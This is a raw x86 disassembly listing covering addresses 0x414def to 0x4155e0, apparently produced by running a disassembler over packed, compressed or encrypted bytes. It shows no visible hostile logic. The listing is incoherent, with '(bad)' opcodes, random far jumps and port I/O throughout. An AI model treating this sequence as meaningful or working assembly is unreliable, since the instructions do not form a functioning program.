  414def:	mov    ch,0xf7
  414df1:	cmp    cl,BYTE PTR [ebx+0x7f538dfb]
  414df7:	fidiv  WORD PTR [esi+0x426e7ecc]
  414dfd:	cmc    
  414dfe:	or     al,0xc6
  414e00:	(bad)  
  414e01:	xlat   BYTE PTR ds:[ebx]
  414e02:	mov    ds:0x94ba252,eax
  414e07:	jg     0x414e3b
  414e09:	xchg   BYTE PTR [ecx],cl
  414e0b:	sahf   
  414e0c:	sbb    DWORD PTR [eax+0x29b3f869],ecx
  414e12:	xchg   ebx,eax
  414e13:	xlat   BYTE PTR ds:[ebx]
  414e14:	out    dx,eax
  414e15:	push   esp
  414e16:	mov    edx,0xbfb16eaf
  414e1b:	inc    esp
  414e1c:	enter  0x7618,0x6
  414e20:	xor    eax,0x173e6bf5
  414e25:	push   esp
  414e26:	outs   dx,BYTE PTR ds:[esi]
  414e27:	push   ecx
  414e28:	push   esp
  414e29:	xchg   ecx,eax
  414e2a:	out    dx,al
  414e2b:	imul   edx,DWORD PTR [di+0x288f],0xa
  414e31:	mov    WORD PTR [esi-0x76],ds
  414e34:	fs call 0xb028:0xa65d1baf
  414e3c:	fisubr DWORD PTR [edx+0x7f]
  414e3f:	jnp    0x414e4c
  414e41:	sub    ch,BYTE PTR [ebp+0x6b50e136]
  414e47:	jns    0x414dd7
  414e49:	into   
  414e4a:	das    
  414e4b:	dec    ebp
  414e4c:	adc    al,0x5b
  414e4e:	fisubr DWORD PTR [ebx]
  414e50:	retf   
  414e51:	jle    0x414e4e
  414e53:	pop    edi
  414e54:	popf   
  414e55:	into   
  414e56:	cs aam 0x45
  414e59:	jl     0x414e48
  414e5b:	or     BYTE PTR [ebx],0xd
  414e5e:	retf   
  414e5f:	out    dx,al
  414e60:	mov    ch,0x62
  414e62:	push   eax
  414e63:	jne    0x414e72
  414e65:	call   0x3490:0x15ed8fc1
  414e6c:	push   0xffffffd1
  414e6e:	pop    esi
  414e6f:	pop    eax
  414e70:	push   eax
  414e71:	mov    ch,0x45
  414e73:	loopne 0x414eb3
  414e75:	not    BYTE PTR [edi]
  414e77:	xor    al,0xb6
  414e79:	lods   al,BYTE PTR ds:[esi]
  414e7a:	add    eax,0xf717eba3
  414e7f:	add    ah,BYTE PTR [eax]
  414e81:	add    al,BYTE PTR [ebx+ebp*1]
  414e84:	add    al,0xe8
  414e86:	stos   DWORD PTR es:[edi],eax
  414e87:	adc    BYTE PTR [edx-0x3c],bh
  414e8a:	je     0x7ea47634
  414e90:	in     al,dx
  414e91:	fsub   QWORD PTR [ebx-0x7ac52598]
  414e97:	sbb    esp,ecx
  414e99:	shl    edi,cl
  414e9b:	test   BYTE PTR [ebx],al
  414e9d:	(bad)  
  414e9e:	or     al,0xbf
  414ea0:	repz pusha 
  414ea2:	and    al,0x3d
  414ea4:	add    eax,ecx
  414ea6:	adc    bl,dh
  414ea8:	pop    eax
  414ea9:	cmc    
  414eaa:	repz shl DWORD PTR [edi],1
  414ead:	xor    al,0x75
  414eaf:	pop    edi
  414eb0:	jnp    0x414e3d
  414eb2:	hlt    
  414eb3:	cmc    
  414eb4:	stc    
  414eb5:	imul   eax,DWORD PTR [edi],0xe05518b1
  414ebb:	jge    0x414e91
  414ebd:	ret    
  414ebe:	(bad)  
  414ebf:	adc    DWORD PTR [edi+0x3e8d673d],esp
  414ec5:	into   
  414ec6:	sbb    al,BYTE PTR [esi+0x69cdb7cb]
  414ecc:	aam    0x3f
  414ece:	repnz push edi
  414ed0:	(bad)  
  414ed1:	dec    esi
  414ed2:	test   al,ch
  414ed4:	xor    al,0x14
  414ed6:	int    0x37
  414ed8:	arpl   WORD PTR [edi+eiz*1],bx
  414edb:	xor    eax,0xc887d495
  414ee0:	fadd   QWORD PTR [edi]
  414ee2:	sub    eax,0x6664659d
  414ee7:	jno    0x414f15
  414ee9:	jmp    0xf3ded034
  414eee:	adc    ebp,DWORD PTR ds:0x652a8017
  414ef4:	mov    ch,0xa6
  414ef6:	xor    ebx,eax
  414ef8:	jne    0x414ef2
  414efa:	dec    ebx
  414efb:	and    DWORD PTR [ebx-0x77],esp
  414efe:	mov    BYTE PTR ss:[eax+0x5b16784e],cl
  414f05:	out    dx,al
  414f06:	pusha  
  414f07:	pusha  
  414f08:	dec    DWORD PTR ds:0x276040a9
  414f0e:	shr    ecx,0xf1
  414f11:	test   edx,edx
  414f13:	xor    BYTE PTR [ebx-0x7a],al
  414f16:	push   cs
  414f17:	or     cl,BYTE PTR [esi+0x7fbf4829]
  414f1d:	add    ch,BYTE PTR [eax+eax*1]
  414f20:	push   0x76a925d1
  414f25:	dec    ebx
  414f26:	(bad)  
  414f27:	es push ds
  414f29:	retf   0xb69e
  414f2c:	push   eax
  414f2d:	cmp    ch,BYTE PTR [ebx+esi*1+0x2f]
  414f31:	mov    ah,0x21
  414f33:	sub    DWORD PTR [esi-0x49],ebp
  414f36:	es mov edi,0x14823a5b
  414f3c:	jno    0x414ece
  414f3e:	repnz jecxz 0x414f1f
  414f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f42:	mov    WORD PTR [ecx+0x5],ss
  414f45:	or     ch,BYTE PTR [ebx+esi*4]
  414f48:	fcomp  DWORD PTR [edi+0x6e]
  414f4b:	adc    al,0x30
  414f4d:	stc    
  414f4e:	jns    0x414f92
  414f50:	je     0x414f79
  414f52:	mov    dh,0xab
  414f54:	das    
  414f55:	mov    ch,0x2b
  414f57:	mov    DWORD PTR [ebp-0x40d8c567],ecx
  414f5d:	add    edi,DWORD PTR [edx-0x7a2d712f]
  414f63:	(bad)  
  414f64:	(bad)  
  414f65:	sub    al,0x89
  414f67:	or     DWORD PTR [eax],eax
  414f69:	add    ecx,ebp
  414f6b:	clc    
  414f6c:	fld    TBYTE PTR [edi+0x16]
  414f6f:	sbb    DWORD PTR [ebx-0x6d8abeed],edi
  414f75:	adc    eax,0x237727d7
  414f7a:	fsubr  st,st(7)
  414f7c:	and    al,0x67
  414f7e:	jmp    0x414f8a
  414f80:	aad    0x22
  414f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f83:	lea    edx,[ebx+0x3d]
  414f86:	ficom  DWORD PTR [ecx+0x131c0196]
  414f8c:	jo     0x414f88
  414f8e:	int    0x7a
  414f90:	scas   al,BYTE PTR es:[edi]
  414f91:	jae    0x414f76
  414f93:	mov    esi,ecx
  414f95:	fld    DWORD PTR [edi+0x6b876bab]
  414f9b:	xor    DWORD PTR [edx-0x47489d77],edi
  414fa1:	adc    ah,BYTE PTR [edi]
  414fa3:	mov    ah,0x88
  414fa5:	and    al,0x4a
  414fa7:	and    BYTE PTR [edx-0x1cfd8b50],al
  414fad:	fistp  DWORD PTR [edi+0x5c]
  414fb0:	add    eax,DWORD PTR [ecx*4+0x3863cd0f]
  414fb7:	ret    0x20b2
  414fba:	ins    BYTE PTR es:[edi],dx
  414fbb:	je     0x41500b
  414fbd:	push   esp
  414fbe:	data16 int 0x90
  414fc1:	out    dx,al
  414fc2:	xchg   edi,eax
  414fc3:	pop    ss
  414fc4:	jae    0x414f8e
  414fc6:	in     al,0x4a
  414fc8:	cmp    DWORD PTR [esi+0x720174c7],esp
  414fce:	ds loopne 0x414fb6
  414fd1:	pop    ecx
  414fd2:	(bad)  
  414fd3:	cmp    BYTE PTR [ebp+0x28],cl
  414fd6:	dec    edi
  414fd7:	jmp    0xc14d:0xe4f51a4a
  414fde:	imul   edx,DWORD PTR [ebx-0x62],0xffffffa9
  414fe2:	mov    ss:0x801fe87b,al
  414fe8:	cmp    DWORD PTR [edx],0xffffff91
  414feb:	xchg   ebp,eax
  414fec:	int3   
  414fed:	mov    ds:0x1f52cf8a,al
  414ff2:	jecxz  0x414ffb
  414ff4:	dec    eax
  414ff5:	mov    ah,bl
  414ff7:	inc    esp
  414ff8:	rcl    DWORD PTR [edi+ecx*2],cl
  414ffb:	ss addr16 addr16 fcmovne st,st(5)
  415000:	push   esp
  415001:	int    0x3d
  415003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415004:	pop    edx
  415005:	gs mov ch,0x75
  415009:	(bad)  
  41500a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41500b:	mov    ds:0xb4bf3f37,al
  415010:	aam    0x2f
  415012:	adc    al,0x5e
  415014:	mov    al,BYTE PTR [eax-0x41]
  415017:	pop    ebx
  415018:	sub    al,0x4a
  41501a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501b:	enter  0xb5b3,0xc6
  41501f:	or     al,0x3c
  415021:	sub    DWORD PTR ds:0xda566cce,ebx
  415027:	out    0x23,eax
  415029:	icebp  
  41502a:	int    0xd8
  41502c:	imul   edi,DWORD PTR [ebp+0x6a],0x21
  415030:	fnsave [edx-0x68224e38]
  415036:	addr16 jl 0x415011
  415039:	mul    BYTE PTR [ebx]
  41503b:	sbb    al,0xa3
  41503d:	adc    ebp,0x14547be4
  415043:	pop    esp
  415044:	mov    dl,0x41
  415046:	adc    al,BYTE PTR [ebp-0x6544131c]
  41504c:	push   ds
  41504d:	cmp    DWORD PTR [ecx+0x3251b47a],esi
  415053:	pop    ebx
  415054:	ins    BYTE PTR es:[edi],dx
  415055:	int    0x6
  415057:	pop    ecx
  415058:	mov    al,ds:0xe07d438
  41505d:	ins    DWORD PTR es:[edi],dx
  41505e:	cmp    al,0x6a
  415060:	adc    DWORD PTR [ebx],ecx
  415062:	mov    eax,0xad054b99
  415067:	push   ecx
  415068:	ja     0x4150be
  41506a:	xor    DWORD PTR [esi-0x43814d31],0x6f3b0448
  415074:	and    DWORD PTR [eax+ebx*1+0x5db7f365],esi
  41507b:	adc    esi,DWORD PTR [ebp+0x2d]
  41507e:	out    0xed,eax
  415080:	cld    
  415081:	dec    esi
  415082:	dec    ecx
  415083:	std    
  415084:	inc    ecx
  415085:	xor    ecx,DWORD PTR ds:0x5fbb60d1
  41508b:	scas   eax,DWORD PTR es:[edi]
  41508c:	pushf  
  41508d:	push   0x44
  41508f:	add    ch,BYTE PTR ds:0x4bb492d1
  415095:	cdq    
  415096:	xchg   edx,eax
  415097:	icebp  
  415098:	pop    ecx
  415099:	adc    BYTE PTR [ebp-0x1e],cl
  41509c:	and    ebp,DWORD PTR ds:0xfea27ec0
  4150a2:	int3   
  4150a3:	adc    ebx,ebx
  4150a5:	cmp    bl,bh
  4150a7:	sti    
  4150a8:	mov    bh,0xc4
  4150aa:	push   0xffffffee
  4150ac:	mov    ah,0x34
  4150ae:	add    ecx,0x5f
  4150b1:	gs enter 0x8087,0xa2
  4150b6:	imul   esi,DWORD PTR [ebx+0x3d],0x1cd53399
  4150bd:	loope  0x415096
  4150bf:	enter  0xad42,0x79
  4150c3:	inc    ebp
  4150c4:	mov    BYTE PTR [eax+0x73],0x1e
  4150c8:	adc    DWORD PTR [ebp+0x3f],eax
  4150cb:	lds    eax,FWORD PTR [ecx+0x48]
  4150ce:	test   DWORD PTR [eax],0xcff7980c
  4150d4:	call   0x62efdd1d
  4150d9:	cmp    eax,0x5f18d9cc
  4150de:	repnz out dx,eax
  4150e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150e1:	pop    ebp
  4150e2:	mov    eax,DWORD PTR [ebp-0x31]
  4150e5:	outs   dx,DWORD PTR ds:[esi]
  4150e6:	sbb    ecx,DWORD PTR [ecx]
  4150e8:	xchg   BYTE PTR [ebp-0x1d1b78e6],bh
  4150ee:	push   ecx
  4150ef:	jnp    0x415133
  4150f1:	cmp    ebp,eax
  4150f3:	ds fcmovb st,st(3)
  4150f6:	add    DWORD PTR [edi-0x2],edx
  4150f9:	dec    esi
  4150fa:	ja     0x4150d6
  4150fc:	dec    esi
  4150fd:	(bad)
  415100:	rol    BYTE PTR [ebx],cl
  415102:	not    BYTE PTR [edx]
  415104:	push   esi
  415105:	sbb    ch,BYTE PTR [esi+ecx*2-0xe061a9a]
  41510c:	xor    BYTE PTR [ebx-0x112e56d4],0x68
  415113:	sub    DWORD PTR [ecx-0x57af6cbe],0xffffff88
  41511a:	dec    ebx
  41511b:	mov    dh,0xf3
  41511d:	sahf   
  41511e:	cwde   
  41511f:	push   0xffffffcb
  415121:	mov    al,ds:0x759bd88d
  415126:	xor    BYTE PTR [ecx+edi*4+0x24],ah
  41512a:	outs   dx,BYTE PTR ds:[esi]
  41512b:	nop
  41512c:	shl    BYTE PTR [eax-0x7b],1
  41512f:	call   0x11aea60a
  415134:	xchg   ebx,eax
  415135:	(bad)  
  415136:	push   ds
  415137:	jmp    0x4150dd
  415139:	ret    
  41513a:	push   0x65
  41513c:	add    edi,edx
  41513e:	aam    0x96
  415140:	stos   BYTE PTR es:[edi],al
  415141:	or     BYTE PTR [edx],al
  415143:	mov    ch,0x38
  415145:	lods   eax,DWORD PTR ds:[esi]
  415146:	push   ecx
  415147:	(bad)  
  415148:	scas   eax,DWORD PTR es:[edi]
  415149:	leave  
  41514a:	jmp    0xc45200e3
  41514f:	xchg   ebp,eax
  415150:	inc    ebp
  415151:	repnz cmp BYTE PTR ds:0x10890348,bh
  415158:	out    0x42,al
  41515a:	neg    DWORD PTR [esi]
  41515c:	pop    es
  41515d:	jg     0x41519a
  41515f:	mov    eax,0xd708dd41
  415164:	outs   dx,DWORD PTR ds:[esi]
  415165:	test   BYTE PTR [ecx+0x2d1c1e9a],bh
  41516b:	xor    BYTE PTR [eax+0x5b5df106],dh
  415171:	add    al,bh
  415173:	les    ebp,FWORD PTR [bp+si+0x30ba]
  415178:	pop    esp
  415179:	mov    bl,0x62
  41517b:	test   eax,0xa333d52f
  415180:	les    edx,FWORD PTR [edi-0x56]
  415183:	inc    edx
  415184:	lods   al,BYTE PTR ds:[esi]
  415185:	mov    eax,ds:0x2028db01
  41518a:	push   esp
  41518b:	pop    edx
  41518c:	adc    dl,BYTE PTR [edi]
  41518e:	out    dx,al
  41518f:	repnz mov ch,0x96
  415192:	mov    ecx,0x1784ca3
  415197:	stc    
  415198:	aas    
  415199:	je     0x4151d7
  41519b:	xchg   ebx,eax
  41519c:	data16 sub al,0xdd
  41519f:	jge    0x4151e5
  4151a1:	mov    bl,0xef
  4151a3:	mov    ds:0xd9bb0034,eax
  4151a8:	cmc    
  4151a9:	fisttp WORD PTR [eax]
  4151ab:	mov    edx,0xb2e73676
  4151b0:	inc    ebx
  4151b1:	or     BYTE PTR [ebx],0x94
  4151b4:	adc    ebx,DWORD PTR [ecx]
  4151b6:	mov    eax,DWORD PTR [ecx]
  4151b8:	mov    cl,0xcd
  4151ba:	sub    eax,0x86a0eb46
  4151bf:	jo     0x415231
  4151c1:	add    BYTE PTR [edx+ebp*4-0x7a],dl
  4151c5:	dec    ebx
  4151c6:	aaa    
  4151c7:	adc    bl,bh
  4151c9:	daa    
  4151ca:	leave  
  4151cb:	mov    al,ds:0xc88752e4
  4151d0:	sbb    dh,0xbe
  4151d3:	enter  0xaf9e,0xa
  4151d7:	aaa    
  4151d8:	ds enter 0xc583,0x5a
  4151dd:	cdq    
  4151de:	mov    esi,0xdcbcfacc
  4151e3:	mov    ebx,edi
  4151e5:	pop    esp
  4151e6:	fs inc ebx
  4151e8:	mov    esp,0x9a473862
  4151ed:	nop
  4151ee:	pop    ss
  4151ef:	out    0x7a,al
  4151f1:	sahf   
  4151f2:	pop    ebp
  4151f3:	cmp    DWORD PTR [edx+0x49573a35],ecx
  4151f9:	xor    eax,0xb918583c
  4151fe:	jns    0x41524b
  415200:	ins    DWORD PTR es:[edi],dx
  415201:	fldcw  WORD PTR [ebx+0x2de9cf4e]
  415207:	pusha  
  415208:	pop    es
  415209:	cli    
  41520a:	xor    DWORD PTR [eax+0xc5559bf],esi
  415210:	scas   al,BYTE PTR es:[edi]
  415211:	mov    ebx,DWORD PTR [edi+ebp*1]
  415214:	mov    ecx,0xd22c5d58
  415219:	das    
  41521a:	retf   0xa035
  41521d:	adc    DWORD PTR [ecx-0x50d5db08],ebx
  415223:	mov    ds:0x1b352cb8,al
  415228:	mov    dh,0xb5
  41522a:	icebp  
  41522b:	jge    0x41525a
  41522d:	adc    al,0x29
  41522f:	popf   
  415230:	in     eax,dx
  415231:	or     eax,0x8bcf68c7
  415236:	sti    
  415237:	sar    edi,cl
  415239:	jne    0x41527a
  41523b:	lods   al,BYTE PTR ds:[esi]
  41523c:	nop
  41523d:	and    BYTE PTR [eax+0x766618b6],al
  415243:	repz loop 0x4152a2
  415246:	sbb    eax,0xe0ea56da
  41524b:	hlt    
  41524c:	mov    ebp,0xd57b1b0c
  415251:	call   0x154f:0xf6ea3181
  415258:	aam    0x94
  41525a:	arpl   WORD PTR [ecx],ax
  41525c:	or     al,0xef
  41525e:	cdq    
  41525f:	add    ecx,DWORD PTR [edi+0x58ad646a]
  415265:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  415267:	adc    ebx,ebp
  415269:	jne    0x4151ec
  41526b:	int    0x25
  41526d:	dec    esp
  41526e:	sbb    DWORD PTR [ebx],ebx
  415270:	retf   
  415271:	fdiv   QWORD PTR [edx+0x5a718d83]
  415277:	ja     0x415230
  415279:	addr16 mov edx,0xcb8e5779
  41527f:	arpl   WORD PTR [ebp-0x6217d056],di
  415285:	mov    ebx,0x578c4ba0
  41528a:	jnp    0x415299
  41528c:	cdq    
  41528d:	pop    es
  41528e:	ret    
  41528f:	stc    
  415290:	cmp    ebx,esp
  415292:	xlat   BYTE PTR ds:[ebx]
  415293:	xor    edx,eax
  415295:	lods   al,BYTE PTR ds:[esi]
  415296:	lds    edi,FWORD PTR [ebx-0x38]
  415299:	xchg   al,dl
  41529b:	hlt    
  41529c:	mov    bh,0x8b
  41529e:	ficom  DWORD PTR [esi+0x33d8eeef]
  4152a4:	into   
  4152a5:	(bad)  
  4152a6:	xor    ah,BYTE PTR [eax]
  4152a8:	lds    esp,FWORD PTR [ebp+0x49062120]
  4152ae:	push   esi
  4152af:	mov    dl,0xfc
  4152b1:	sahf   
  4152b2:	push   ebp
  4152b3:	sysexit 
  4152b5:	xchg   ecx,eax
  4152b6:	adc    al,0xf0
  4152b8:	mov    dh,0x6d
  4152ba:	es cmc 
  4152bc:	mov    eax,ds:0xd1e7cb73
  4152c1:	ds push ds
  4152c3:	jo     0x415261
  4152c5:	call   0xc209:0xb577b9e0
  4152cc:	push   es
  4152cd:	cmp    BYTE PTR ds:0x39e0d08,0x55
  4152d4:	test   BYTE PTR cs:[ebp-0x53ef2682],ch
  4152db:	fistp  QWORD PTR [eax-0x67]
  4152de:	dec    edi
  4152df:	nop
  4152e0:	cs jae 0x4152f8
  4152e3:	sub    ebp,esp
  4152e5:	fwait
  4152e6:	jp     0x4152fe
  4152e8:	push   ebx
  4152e9:	jl     0x415284
  4152eb:	arpl   WORD PTR [ecx],di
  4152ed:	(bad)  
  4152ee:	fwait
  4152ef:	cld    
  4152f0:	pop    ecx
  4152f1:	call   0xebff59
  4152f6:	clc    
  4152f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4152f9:	out    dx,eax
  4152fa:	jb     0x4152f6
  4152fc:	or     eax,0xb5c4703d
  415301:	es mov ebx,0x8d5735ef
  415307:	jmp    0x6ec3dc00
  41530c:	into   
  41530d:	push   edi
  41530e:	idiv   DWORD PTR [ebp-0x42975aed]
  415314:	xchg   edi,eax
  415315:	inc    edi
  415316:	adc    edi,DWORD PTR [ebx]
  415318:	enter  0xe848,0x38
  41531c:	mov    al,0xee
  41531e:	cmp    DWORD PTR [ecx-0x22],edx
  415321:	mov    cl,0x1e
  415323:	mov    edx,0x2609792b
  415328:	stc    
  415329:	xor    cl,al
  41532b:	out    dx,al
  41532c:	mov    ch,0xa4
  41532e:	and    BYTE PTR gs:[ebx+0x4d78de83],al
  415335:	dec    ebx
  415336:	cmp    al,BYTE PTR [eax-0x4]
  415339:	mov    ah,0xa
  41533b:	cmp    BYTE PTR [eax+ebp*1],ch
  41533e:	or     dh,BYTE PTR [ebx+0x10]
  415341:	icebp  
  415342:	mov    bl,0x56
  415344:	iret   
  415345:	rcr    bh,0xd
  415348:	fwait
  415349:	sar    DWORD PTR [ebx+ebx*8+0x243629c7],0x20
  415351:	mov    ebx,DWORD PTR [ecx]
  415353:	mov    dh,0x77
  415355:	mov    al,ds:0x20405170
  41535a:	inc    ebx
  41535b:	xchg   dl,bh
  41535d:	xchg   esi,eax
  41535e:	pop    es
  41535f:	or     al,0xbe
  415361:	cmp    DWORD PTR cs:[esi],eax
  415364:	inc    BYTE PTR [edi+0xb]
  415367:	repz cmp bl,ch
  41536a:	pop    ss
  41536b:	iret   
  41536c:	cmp    al,0xc0
  41536e:	cwde   
  41536f:	pop    ebp
  415370:	xor    DWORD PTR [esi+0xe6aea2f],ebp
  415376:	pop    esi
  415377:	xor    bl,BYTE PTR [ecx+eiz*1+0x64]
  41537b:	jae    0x4153c3
  41537d:	dec    edx
  41537e:	scas   al,BYTE PTR es:[edi]
  41537f:	sbb    eax,0x230aa588
  415384:	in     al,dx
  415385:	rcr    DWORD PTR [eax],0xc1
  415388:	les    ebp,FWORD PTR [esi+ebx*2-0x63009e94]
  41538f:	in     eax,0xde
  415391:	test   al,0x46
  415393:	mov    ecx,0x5f407d7b
  415398:	sub    al,BYTE PTR [eax+0x31]
  41539b:	sub    al,0x88
  41539d:	(bad)  
  41539e:	leave  
  41539f:	xchg   DWORD PTR [edi+0x782244e5],ecx
  4153a5:	pop    edx
  4153a6:	push   ebx
  4153a7:	pop    eax
  4153a8:	xor    eax,0x12459d5c
  4153ad:	js     0x415375
  4153af:	gs test al,0xa8
  4153b2:	add    al,dh
  4153b4:	lods   eax,DWORD PTR ds:[esi]
  4153b5:	cs leave 
  4153b7:	push   esi
  4153b8:	ds mov ch,0x37
  4153bb:	scas   al,BYTE PTR es:[edi]
  4153bc:	out    dx,eax
  4153bd:	aaa    
  4153be:	pop    esp
  4153bf:	and    ebx,DWORD PTR [eax-0x28]
  4153c2:	rcl    BYTE PTR [eax+0x19],cl
  4153c5:	xchg   ecx,eax
  4153c6:	mov    cl,dl
  4153c8:	xor    BYTE PTR [ebx],al
  4153ca:	sub    DWORD PTR [edx-0x3142599f],esi
  4153d0:	icebp  
  4153d1:	mov    bl,0xf2
  4153d3:	loop   0x4153cf
  4153d5:	inc    esp
  4153d6:	ds push ebx
  4153d8:	pop    ecx
  4153d9:	and    edx,DWORD PTR [edi+ecx*2+0x69]
  4153dd:	xchg   ebp,eax
  4153de:	sti    
  4153df:	lea    edi,[esi-0x1fc7c551]
  4153e5:	mov    WORD PTR fs:[esi-0x3592b4fd],fs
  4153ec:	js     0x41544c
  4153ee:	ins    DWORD PTR es:[edi],dx
  4153ef:	ficom  WORD PTR [ebp+0x2c]
  4153f2:	adc    DWORD PTR [ebx+0x2c472400],ebx
  4153f8:	ret    0x68a2
  4153fb:	popa   
  4153fc:	pusha  
  4153fd:	cmp    ah,al
  4153ff:	sub    eax,0x1f32fa91
  415404:	mov    esp,0x47db01f2
  415409:	sbb    edx,DWORD PTR [esi]
  41540b:	mov    bl,0x33
  41540d:	add    DWORD PTR [ecx],ecx
  41540f:	loope  0x4153ad
  415411:	sbb    ecx,DWORD PTR [ecx-0x6066fcf3]
  415417:	inc    ebp
  415418:	sub    ax,0xa29
  41541c:	adc    eax,0xe7992df7
  415421:	jg     0x415424
  415423:	enter  0x53b1,0x4c
  415427:	pushf  
  415428:	pop    ebx
  415429:	dec    edi
  41542a:	add    eax,0x77fa9d2c
  41542f:	and    bl,BYTE PTR [edi-0x57543393]
  415435:	mov    al,0x60
  415437:	mov    ds,edx
  415439:	mov    dl,BYTE PTR [ebx-0x69]
  41543c:	push   edx
  41543d:	rol    BYTE PTR [edx+eiz*8-0x5dc4a0a3],cl
  415444:	rcl    DWORD PTR [ebx+esi*1-0x3706bd5c],cl
  41544b:	cmp    al,0xa4
  41544d:	cmp    al,0x9b
  41544f:	and    bl,cl
  415451:	mov    edx,0xff140826
  415456:	inc    edi
  415457:	jge    0x415486
  415459:	sbb    DWORD PTR [edx-0x6a3158ed],esi
  41545f:	cdq    
  415460:	and    BYTE PTR [edi+ebx*2],bl
  415463:	ret    
  415464:	mov    ds:0xa3697dec,al
  415469:	push   eax
  41546a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41546b:	ins    BYTE PTR es:[edi],dx
  41546c:	int3   
  41546d:	sub    BYTE PTR [ebp+0x79],al
  415470:	int3   
  415471:	pop    esi
  415472:	enter  0xff5b,0x3
  415476:	sub    al,0xb2
  415478:	mov    WORD PTR [esi-0x2],ds
  41547b:	add    eax,ecx
  41547d:	xchg   ebp,eax
  41547e:	sbb    esi,ecx
  415480:	ret    0x2d18
  415483:	ds (bad) 
  415486:	fimul  WORD PTR [ebx]
  415488:	dec    ebx
  415489:	or     al,0xb8
  41548b:	jo     0x4154f6
  41548d:	and    DWORD PTR [eax],ebp
  41548f:	xchg   ecx,eax
  415490:	hlt    
  415491:	and    DWORD PTR [eax-0x33],ebx
  415494:	call   FWORD PTR [ebp-0x51]
  415497:	xchg   edi,eax
  415498:	popf   
  415499:	(bad)  
  41549a:	mov    eax,0x58d87ceb
  41549f:	pushf  
  4154a0:	(bad)  
  4154a1:	push   ebx
  4154a2:	jno    0x4154e2
  4154a4:	outs   dx,BYTE PTR ds:[esi]
  4154a5:	sbb    al,0xbb
  4154a7:	loope  0x41551f
  4154a9:	dec    ebp
  4154aa:	cld    
  4154ab:	jmp    FWORD PTR [esi]
  4154ad:	aaa    
  4154ae:	jne    0x415441
  4154b0:	iret   
  4154b1:	jo     0x4154d8
  4154b3:	jmp    0x60b8e322
  4154b8:	mov    esp,0x94ec30c
  4154bd:	test   eax,0xd24b9e3a
  4154c2:	jl     0x4154cd
  4154c4:	or     BYTE PTR ds:0x8e3932b5,0xdb
  4154cb:	add    al,0xd2
  4154cd:	adc    al,0x0
  4154cf:	adc    ebx,esp
  4154d1:	imul   ebx,DWORD PTR [edi-0x64f42b93],0x82871b41
  4154db:	hlt    
  4154dc:	push   esi
  4154dd:	loop   0x4154f3
  4154df:	lods   eax,DWORD PTR ds:[esi]
  4154e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e2:	shr    esi,1
  4154e4:	sbb    esi,DWORD PTR [ebx]
  4154e6:	pop    edx
  4154e7:	dec    edi
  4154e8:	xlat   BYTE PTR ds:[ebx]
  4154e9:	cmp    bl,BYTE PTR [ebx]
  4154eb:	fwait
  4154ec:	mov    esi,0x51a72fec
  4154f1:	setae  BYTE PTR [edi+0x2faec1e]
  4154f8:	mov    ecx,0x7070a61a
  4154fd:	int    0xfb
  4154ff:	mov    WORD PTR [ecx+0x1149ed67],fs
  415505:	sub    al,0x9d
  415507:	ja     0x415558
  415509:	mov    ebx,0xc252e391
  41550e:	lahf   
  41550f:	cmp    bh,BYTE PTR [edi-0x5f]
  415512:	or     al,0x7c
  415514:	fsubr  DWORD PTR [edi]
  415516:	imul   edi,esp,0xf
  415519:	jmp    0x7196d920
  41551e:	push   ebp
  41551f:	pop    esp
  415520:	out    0xc2,al
  415522:	dec    edx
  415523:	jae    0x4154ee
  415525:	jns    0x4154bd
  415527:	dec    BYTE PTR [ebx]
  415529:	push   ebp
  41552a:	rcl    dl,0x75
  41552d:	pop    ebp
  41552e:	das    
  41552f:	iret   
  415530:	and    ch,ch
  415532:	jmp    0x4154cf
  415534:	adc    ch,BYTE PTR [eax]
  415536:	ret    0xb4fe
  415539:	cmp    esi,DWORD PTR [eax-0x5a]
  41553c:	ja     0x41557c
  41553e:	mov    bh,0x94
  415540:	sub    eax,0xfeff56ff
  415545:	fnstcw WORD PTR [edi+0x78]
  415548:	add    ah,BYTE PTR ds:0xcd8afad6
  41554e:	cmp    eax,DWORD PTR [esi-0x4]
  415551:	jmp    0x4154e7
  415553:	cmp    DWORD PTR [esi-0x6a3f3a73],esp
  415559:	cmp    BYTE PTR [ebp-0x3e],dl
  41555c:	hlt    
  41555d:	mov    ah,0x5d
  41555f:	push   eax
  415560:	(bad)  
  415561:	clc    
  415562:	xchg   esi,eax
  415563:	jl     0x4154fd
  415565:	and    al,BYTE PTR [esi-0x3fbe1968]
  41556b:	push   ebp
  41556c:	lds    edi,FWORD PTR [ecx-0x43eade7f]
  415572:	clc    
  415573:	ret    
  415574:	fcomip st,st(1)
  415576:	(bad)  
  415577:	jmp    0x93132a8
  41557c:	repz mov edx,0x565936b8
  415582:	imul   eax,DWORD PTR [edi+eax*8+0x6bb81ff7],0x6a
  41558a:	lods   eax,DWORD PTR ds:[esi]
  41558b:	sbb    al,0xce
  41558d:	dec    edx
  41558e:	aaa    
  41558f:	retf   0xcb68
  415592:	xchg   ebp,eax
  415593:	push   edx
  415594:	popf   
  415595:	add    al,0x7
  415597:	sahf   
  415598:	iret   
  415599:	rcl    DWORD PTR ds:[edi+edx*4+0x38757a42],1
  4155a1:	mov    ds:0x52adf879,al
  4155a6:	mov    ebx,0xe7e8a6f5
  4155ab:	test   BYTE PTR [edx+0x4a],bh
  4155ae:	mov    DWORD PTR [eax+0x59],esi
  4155b1:	xor    al,0x29
  4155b3:	sbb    eax,0xda88d4a1
  4155b8:	not    DWORD PTR [edi-0x359d68b9]
  4155be:	push   edx
  4155bf:	jmp    0x1cabc798
  4155c4:	cmp    bh,BYTE PTR [ebx]
  4155c6:	js     0x4155ef
  4155c8:	out    dx,eax
  4155c9:	mov    al,0xac
  4155cb:	push   esi
  4155cc:	adc    eax,0xe2f23f69
  4155d1:	inc    ecx
  4155d2:	mov    ecx,0xec485d1f
  4155d7:	xchg   DWORD PTR [esi],esi
  4155d9:	jne    0x4155d8
  4155db:	push   ss
  4155dc:	pop    ebx
  4155dd:	push   esi
  4155de:	add    dh,ch
  4155e0:	jbe    0x4155c5
